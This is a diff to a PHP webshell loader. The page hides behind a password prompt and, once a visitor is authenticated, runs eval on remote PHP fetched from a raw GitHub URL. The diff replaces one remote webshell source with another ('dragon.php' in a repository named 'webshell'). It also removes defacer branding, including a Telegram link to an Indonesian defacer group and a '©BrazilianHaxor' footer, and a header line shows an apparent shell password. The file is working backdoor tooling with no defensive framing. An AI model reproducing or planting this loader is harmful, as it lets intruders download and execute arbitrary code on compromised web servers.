@@ -76,7 +76,7 @@ function login_shell() {
     // Check if user is already authenticated
     if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
         // Execute webshell directly
-        eval("?>" . getURL("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/foxd.php"));
+        eval("?>" . getURL("https://raw.githubusercontent.com/DOYOUMISSME/webshell/refs/heads/main/dragon.php"));
         exit;
     }
 
@@ -95,7 +95,7 @@ function login_shell() {
         if ($input_password_hash === $password_hash) {
             // Password correct, set session and execute webshell
             $_SESSION['authenticated'] = true;
-            eval("?>" . getURL("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/foxd.php"));
+            eval("?>" . getURL("https://raw.githubusercontent.com/DOYOUMISSME/webshell/refs/heads/main/dragon.php"));
             exit;
         } else {
             // Incorrect password, trigger popup
@@ -186,58 +186,11 @@ PASS:0XTEAM
     <input type="password" name="password" autofocus>
 </form>
 </div>
-  <a class="telegram-link" href="https://t.me/DefacerIndonesia1337" target="_blank" rel="noopener noreferrer">Join Telegram</a>
 
-  <div class="audio-container">
-    <audio id="audio" preload="auto">
-      <source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mp3" />
-      Your browser does not support the Upload File element.
-    </audio>
-    <div class="audio-controls">
-      <button class="audio-button play-button" onclick="togglePlayPause()">➕Upload File</button>
-      <button class="audio-button pause-button" onclick="togglePlayPause()" style="display: none;">🗿WAKAKAKA</button>
-    </div>
-  </div>
 
-  <div class="date-time" id="date-time"></div>
+  
 
-  <footer>©BrazilianHaxor</footer>
 
-  <!-- Highlight.js Script -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-  <script>hljs.highlightAll();</script>
-
-  <script>
-    const audio = document.getElementById('audio');
-    const playBtn = document.querySelector('.play-button');
-    const pauseBtn = document.querySelector('.pause-button');
-
-    function togglePlayPause() {
-      if (audio.paused) {
-        audio.play();
-        playBtn.style.display = 'none';
-        pauseBtn.style.display = 'inline-block';
-      } else {
-        audio.pause();
-        playBtn.style.display = 'inline-block';
-        pauseBtn.style.display = 'none';
-      }
-    }
-
-    function updateDateTime() {
-      const now = new Date();
-      const day = now.getDate().toString().padStart(2, '0');
-      const month = (now.getMonth() + 1).toString().padStart(2, '0');
-      const year = now.getFullYear();
-      const hours = now.getHours().toString().padStart(2, '0');
-      const minutes = now.getMinutes().toString().padStart(2, '0');
-      const seconds = now.getSeconds().toString().padStart(2, '0');
-      document.getElementById('date-time').innerText = `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
-    }
-
-    setInterval(updateDateTime, 1000);
-    updateDateTime();
-  </script>
 </body>
 </html>
 <?php
